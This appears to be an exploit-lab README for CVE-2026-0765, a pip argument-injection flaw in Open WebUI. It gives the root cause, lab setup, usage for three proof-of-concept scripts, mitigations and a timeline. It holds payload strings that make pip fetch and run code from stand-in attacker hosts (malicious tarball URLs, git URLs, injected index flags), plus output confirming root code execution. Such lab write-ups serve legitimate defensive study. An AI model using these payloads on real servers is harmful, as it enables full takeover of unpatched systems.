# CVE-2026-0765: Open WebUI Remote Code Execution via pip Command Injection

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel)

| Field | Value |
|-------|-------|
| **CVE** | CVE-2026-0765 |
| **Target** | Open WebUI <= v0.8.5 |
| **Class** | CWE-78 — OS Command Injection |
| **CVSS** | 8.8 (HIGH) `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| **EPSS** | 0.6% (70.3rd percentile) |
| **Vendor** | open-webui |
| **Patch** | None (0-day — no fix as of v0.8.5) |
| **Advisory** | [ZDI-26-031](https://www.zerodayinitiative.com/advisories/ZDI-26-031/) |

## Overview

CVE-2026-0765 is a critical OS Command Injection vulnerability in [Open WebUI](https://github.com/open-webui/open-webui)'s `install_frontmatter_requirements()` function. An authenticated user with tool/function creation permissions can inject arbitrary arguments into a `pip install` subprocess call via crafted frontmatter in tool content, achieving **Remote Code Execution (RCE)** on the server. The default Docker deployment runs as root (UID=0), resulting in full server compromise.

This is a **0-day vulnerability** — the vendor has not provided a patch despite disclosure by Trend Micro ZDI (ZDI-26-031).

## Affected Versions

- **Vulnerable**: All versions from commit `367fa039a` (2024-08-08) onward, including **v0.6.32** (tested) through **v0.8.5** (latest release at time of writing)
- **Fixed**: **None** — no patch has been released
- **Introduced in**: Commit [`367fa039a0fa`](https://github.com/open-webui/open-webui/commit/367fa039a0fa0f7d3599437421057186549761e2) — "added install_frontmatter_requirements"

> **Note**: In v0.8.5, a feature flag `ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS` was added (defaults to `True`). This can optionally disable the entire feature but does **not** add any input validation — it is a mitigation toggle, not a security fix.

## Root Cause

The vulnerability resides in the `install_frontmatter_requirements()` function in `backend/open_webui/utils/plugin.py` (line 267 at v0.6.32). This function processes user-supplied Python package requirements from tool/function frontmatter metadata and passes them directly to `subprocess.check_call()` as arguments to `pip install` **without any validation or sanitization**.

```python
def install_frontmatter_requirements(requirements: str):
    if requirements:
        req_list = [req.strip() for req in requirements.split(",")]
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install"]
            + PIP_OPTIONS
            + req_list              # ← ATTACKER-CONTROLLED
            + PIP_PACKAGE_INDEX_OPTIONS
        )
```

While `subprocess.check_call()` uses list form (preventing shell metacharacter injection), **pip itself is the command interpreter** — it processes URLs, VCS specifiers, and flags within its arguments. An attacker can supply a malicious package URL (e.g., `https://attacker/evil.tar.gz` or `git+http://attacker/repo.git`) that causes pip to download and execute a weaponized `setup.py`, or inject pip flags (e.g., `--extra-index-url`) via comma-separated values to redirect package resolution to an attacker-controlled server.

The `requirements` value originates from user-controlled HTTP request body content (the `content` field of tool/function creation APIs). Frontmatter is extracted via a permissive regex that accepts any characters after the `requirements:` key. There is zero validation between user input and subprocess execution.

## Lab Setup

### Prerequisites

- Docker with Compose plugin
- Python 3 on the host (for running PoC scripts)

### Quick Start

```bash
cd CVE-2026-0765

# Start the lab (pulls pre-built image, no build needed)
docker compose up -d

# Wait for healthy status (~30 seconds)
docker inspect --format='{{.State.Health.Status}}' cve-2026-0765-vulnerable

# Verify
curl http://localhost:8080/health
# Expected: {"status":true}
```

### Container Details

| Container | Image | Role | Host Port |
|-----------|-------|------|-----------|
| `cve-2026-0765-vulnerable` | `ghcr.io/open-webui/open-webui:v0.6.32` | Vulnerable Open WebUI instance | 8080 |

### Environment Variables

| Variable | Value | Purpose |
|----------|-------|---------|
| `WEBUI_SECRET_KEY` | `poc-secret-key-cve-2026-0765` | JWT signing key |
| `USE_SLIM_DOCKER` | `true` | Skip ML model downloads (~2GB saved) |
| `USE_OLLAMA_DOCKER` | `false` | No Ollama backend needed |
| `WEBUI_AUTH` | `true` | Authentication enabled |
| `ENABLE_SIGNUP` | `true` | Self-registration enabled |

### Stopping & Resetting

```bash
# Stop lab
docker compose down

# Full reset (removes database — re-registration required)
docker compose down -v
docker compose up -d
```

## PoC Usage

Three independent PoC scripts demonstrate the vulnerability via different attack vectors. All scripts use **Python 3 stdlib only** (no external dependencies) and are entirely self-contained.

Each PoC runs from the **host** — it starts a local HTTP server to serve the malicious payload, then triggers the target's `pip install` to fetch from it. The attacker host must be reachable from the Docker container.

### Vector 1: HTTP tar.gz sdist (Primary)

The attacker hosts a malicious Python sdist package on an HTTP server. When pip installs from the URL, it extracts and executes the weaponized `setup.py`.

```bash
python3 poc/poc.py <target_host> <target_port> <attacker_host> <attacker_port>
```

**Example:**
```bash
python3 poc/poc.py 127.0.0.1 8080 host.docker.internal 9999
```

### Vector 2: git+http:// VCS Clone

Instead of a direct URL, this uses a `git+http://` VCS specifier. pip invokes `git clone` followed by `setup.py` execution.

```bash
python3 poc/poc_vector2_git.py <target_host> <target_port> <attacker_host> <attacker_port>
```

**Example:**
```bash
python3 poc/poc_vector2_git.py 127.0.0.1 8080 host.docker.internal 9998
```

### Vector 3: pip Flag Injection (Stealthiest)

Exploits the comma-splitting of requirements to inject `--extra-index-url` and `--trusted-host` flags, redirecting pip to an attacker-controlled PyPI index that serves a malicious package.

```bash
python3 poc/poc_vector3_flaginjection.py <target_host> <target_port> <attacker_host> <attacker_port>
```

**Example:**
```bash
python3 poc/poc_vector3_flaginjection.py 127.0.0.1 8080 host.docker.internal 9997
```

### Expected Output (All Vectors)

Each PoC follows a 5-step process:

1. **Check target availability** — verifies Open WebUI is up and running v0.6.32
2. **Prepare malicious payload** — builds and serves the attack package
3. **Authenticate** — signs up as the first user (automatically becomes admin)
4. **Exploit** — creates a malicious tool via `POST /api/v1/tools/create` with crafted `requirements` frontmatter
5. **Verify RCE** — checks for marker file written by the malicious `setup.py`

Successful exploitation outputs:

```
  ============================================================
  [!!!] RCE CONFIRMED — CVE-2026-0765 EXPLOITED SUCCESSFULLY
  ============================================================

  Marker file contents:
    CVE-2026-0765 - PoC Exploitation Successful
    Timestamp: 2026-03-01T05:50:03.858741
    Hostname: 2b4055498c2d
    UID: 0
    GID: 0
    User: root
    ID: uid=0(root) gid=0(root) groups=0(root)
```

### Authentication

All PoC scripts handle authentication automatically:
- **Fresh instance**: Signs up as the first user (becomes admin automatically)
- **Existing instance**: Signs in with lab credentials (`admin@poc.local` / `LabPass123`)

## Verification

### Vulnerable (v0.6.32) — RCE Confirmed

All three attack vectors successfully demonstrate remote code execution:

| Vector | Payload Type | Marker File | Result |
|--------|-------------|-------------|--------|
| HTTP tar.gz sdist | `http://ATTACKER/evil-1.0.tar.gz` | `/tmp/pwned_cve_2026_0765` | RCE as root |
| git+http:// VCS | `git+http://ATTACKER/repo.git#egg=evil` | `/tmp/pwned_cve_2026_0765_git` | RCE as root |
| pip flag injection | `--extra-index-url, http://ATTACKER/simple/, evil-pkg` | `/tmp/pwned_cve_2026_0765_flaginject` | RCE as root |

**Manual verification:**
```bash
docker exec cve-2026-0765-vulnerable cat /tmp/pwned_cve_2026_0765
```

### Patched — No Patch Available

**No patched version exists.** This is a 0-day vulnerability. The vendor has not released a fix as of v0.8.5 (latest release).

**Partial mitigation** (v0.8.5+): Set `ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS=false` to disable the feature entirely.

## Fix

### Status: No Fix Available (0-day)

No upstream fix exists. The vulnerability was disclosed by Trend Micro ZDI as a 0-day (ZDI-26-031) after the vendor closed the report without providing a patch.

### What a Proper Fix Would Require

1. **Package name validation**: Restrict `requirements` values to valid PyPI package name specifiers only (matching `^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?([<>=!~].*)?$`)
2. **URL rejection**: Block direct URLs (`http://`, `https://`, `git+`), VCS specifiers, and local file paths
3. **Flag injection prevention**: Reject tokens starting with `-` to prevent pip argument injection
4. **Allowlist approach**: Optionally maintain a curated list of permitted packages
5. **Sandbox pip execution**: Run pip in a restricted context with `--no-build-isolation` and without network access to untrusted sources

### Recommended Mitigations (Until Fix Is Available)

- **Disable pip install feature** (v0.8.5+): `ENABLE_PIP_INSTALL_FRONTMATTER_REQUIREMENTS=false`
- **Restrict tool creation permissions**: Limit `workspace.tools` permission to trusted administrators only
- **Network segmentation**: Block outbound network access from the Open WebUI container to untrusted hosts
- **Disable self-registration**: Set `ENABLE_SIGNUP=false` after initial admin setup

## References

| Reference | URL |
|-----------|-----|
| **ZDI Advisory** | https://www.zerodayinitiative.com/advisories/ZDI-26-031/ |
| **GHSA** | https://github.com/advisories/GHSA-qr7m-hwp7-qjqg |
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2026-0765 |
| **Source Repository** | https://github.com/open-webui/open-webui |
| **Introduction Commit** | https://github.com/open-webui/open-webui/commit/367fa039a0fa0f7d3599437421057186549761e2 |
| **Vulnerable Release** | https://github.com/open-webui/open-webui/releases/tag/v0.6.32 |
| **Docker Image** | `ghcr.io/open-webui/open-webui:v0.6.32` |

### Related CVEs

| CVE | Description |
|-----|-------------|
| [CVE-2026-0766](../CVE-2026-0766/) | Open WebUI `exec()` Code Injection to RCE (same `plugin.py`, different function) |

## Timeline

| Date | Event |
|------|-------|
| 2024-08-08 | Vulnerable function `install_frontmatter_requirements()` introduced in commit `367fa039a` |
| 2025-09-29 | Open WebUI v0.6.32 released (version cited in advisory) |
| 2025-10-09 | Vulnerability reported to vendor by Trend Micro ZDI (Peter Girnus, Brandon Niemczyk) |
| 2026-01-09 | ZDI publishes advisory ZDI-26-031 as 0-day after vendor fails to respond/patch |
| 2026-01-23 | CVE-2026-0765 published |
| 2026-03-01 | PoC developed and verified (this lab) |

## Disclaimer

These proof-of-concept materials are provided for **authorized security testing and educational purposes only**. They exist to help defenders understand, detect, and remediate vulnerabilities in their environments.

**Do not** use these tools against systems you do not own or have explicit written authorization to test. Unauthorized access to computer systems is illegal in most jurisdictions.

The authors assume no liability for misuse. This project follows responsible disclosure practices.
